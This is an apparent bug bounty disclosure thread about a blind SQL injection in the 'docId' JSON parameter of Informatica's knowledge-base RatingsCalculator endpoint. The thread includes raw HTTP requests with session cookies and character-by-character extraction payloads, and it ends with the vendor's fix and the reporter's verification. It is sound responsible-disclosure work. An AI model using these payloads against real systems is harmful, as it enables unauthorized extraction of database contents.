title: [informatica.com] Blind SQL Injection

profile.name: Informatica
profile.about: Informatica Corporation is the worldâ€™s number one independent provider of data integration software.

vulnerability_information:
Hi guys!

JSON POST parameter "docId" is vulnerable to Blind SQL Injection attack

PoC (Raw query)

POST /_vti_bin/RatingsCalculator/RatingsCalculator.asmx/CalculateRatings HTTP/1.1
User-Agent: Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.17
Host: kb-test.informatica.com
Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate
Referer: https://kb-test.informatica.com/KBExternal/pages/infasearch.aspx?k=pew
Cookie: ASP.NET_SessionId=03khmmjpaxvcos45opn2kg55; BIGipServerkb-test-pool=2670002442.22811.0000; WebAnalyticsSessionId2=b600796d-cd0e-4797-9610-872c18063793; kbemail=; mkt_cookie=anonymous; __cdrop=.D1P9XM.; _ga=GA1.2.1961398489.1453319834; _mkto_trk=id:189-ZHZ-794&token:_mch-informatica.com-1452163097365-89988; s_vnum=1458351793680%26vn%3D1; gpv_p14=welcome%20page%3Awelcome; s_ppv=-%2C76%2C76%2C947; s_cc=true; gpv2=kb%3Aproddocsearch; s_nr=1455762795883-Repeat; s_invisit=true; s_sq=informatica-mysupport-dev%3D%2526pid%253Dhttps%25253A%25252F%25252Fkb.informatica.com%25252F_layouts%25252FProductDocumentation%25252FPage%25252FProductDocumentSearch.aspx%2526oid%253Dhttps%25253A%25252F%25252Fkb.informatica.com%25252F_layouts%25252FProductDocumentation%25252FPage%25252FProductDocumentSearch.aspx%252523%2526ot%253DA; wooTracker=vALSmwIXvuQp; AMCV_C0B11CFE5330AAFD0A490D45%40AdobeOrg=793872103%7CMCIDTS%7C16850%7CMCMID%7C49728577452301121918884624029572688913%7CMCAAMLH-1456367601%7C6%7CMCAAMB-1456367601%7CNRX38WO0n5BH8Th-nqAG_A%7CMCAID%7CNONE; mbox=check#true#1455762863|session#1455762802845-749291#1455764663
Connection: Keep-Alive
Content-Length: 117
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Type: application/json;charset=utf-8

{docId:"1 and (select substring(@@version,1,1))='M'", docTitle:'Getting an error while trying to import WSDL as...' }

for a TRUE query we get - {"d":"3"}
for a FALSE - {"d":""}
for a Syntax error - {"Message":"There was an error processing the request.","StackTrace":"","ExceptionType":""}

so using this blind technique we can extract the data from Database

examples

docId:"1 and (select substring(@@version,1,1))='M'" - true
docId:"1 and (select substring(@@version,2,1))='i'" - true
docId:"1 and (select substring(@@version,3,1))='c'" - true

docId:"1 and (select substring(@@version,22,1))='2'"
docId:"1 and (select substring(@@version,23,1))='0'"
docId:"1 and (select substring(@@version,24,1))='0'"
docId:"1 and (select substring(@@version,25,1))='8'"

and so on.. . So we have a MS SQL Server 2008

activities.message:
The same vulnerability exists in kb.informatica.com subdomain

POST /_vti_bin/RatingsCalculator/RatingsCalculator.asmx/CalculateRatings HTTP/1.1
User-Agent: Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.17
Host: kb.informatica.com
Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate
Referer: https://kb.informatica.com/KBExternal/Pages/infasearch.aspx?r='%22%3Epew
Cookie: ASP.NET_SessionId=3eiqyg55ovskby45qfxm5o55; BIGipServerkb-in-int-Pool=4179624202.22811.0000; __atuvc=3%7C4%2C0%7C5%2C0%7C6%2C1%7C7%2C7%7C8; __atuvs=56c9a2cbea28ee8d006; WebAnalyticsSessionId2=30700f32-744f-48bf-bcbc-713ab7d27d7e; kbemail=; mkt_cookie=anonymous; __cdrop=.D1P9XM.; _ga=GA1.2.1961398489.1453319834; _mkto_trk=id:189-ZHZ-794&token:_mch-informatica.com-1452163097365-89988; AMCV_C0B11CFE5330AAFD0A490D45%40AdobeOrg=793872103%7CMCIDTS%7C16850%7CMCMID%7C49728577452301121918884624029572688913%7CMCAAMLH-1456367601%7C6%7CMCAAMB-1456367601%7CNRX38WO0n5BH8Th-nqAG_A%7CMCAID%7CNONE; mbox=check#true#1455762863|session#1455762802845-749291#1455764663|PC#1455762802845-749291.26_4#1456972407; s_vnum=1458351793680%26vn%3D2; s_cc=true; gpv_p14=kb%3Asearchresults; gpv2=kb%3Asearchresults; s_nr=1456055154279-Repeat; s_invisit=true; s_sq=%5B%5BB%5D%5D; wooTracker=vALSmwIXvuQp; s_ppv=-%2C37%2C37%2C947
Connection: Keep-Alive
Content-Length: 67
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Type: application/json;charset=utf-8

{docId:"1 and (select substring(@@version,1,1))='M'", docTitle:'' }

Hi @konqi,

Thank you for your report. I am trying to recreate the issue and it the responses I get are identical even while changing the the payload.

Hi! I made a little video of reproducing the issue.

https://www.youtube.com/watch?v=m5J7Rs4O3do

watch in HD

Hi @konqi,

Thank you for the video! I successfully recreated the vulnerability.
I will share this with the team and follow up with you once I have additional information.

Hi @konqi,

A fix was put in place on kb-test.informatica.com.

Can you please verify if you can still reproduce this issue there?

Thank you!

Hi! 

I was not able to reproduce the issue anymore on kb-test.informatica.com

Hi @konqui 
This issue is fixed in kb.informatica.com as well. Please verify if you can still reproduce this issue.

Thank you.

Hi!

I can confirm that your fix is proper. Can we disclose it now?

Congratulations! Your bug is eligible for swag. Please make sure your address and shirt size are correct in Hacker One.

Thank you!
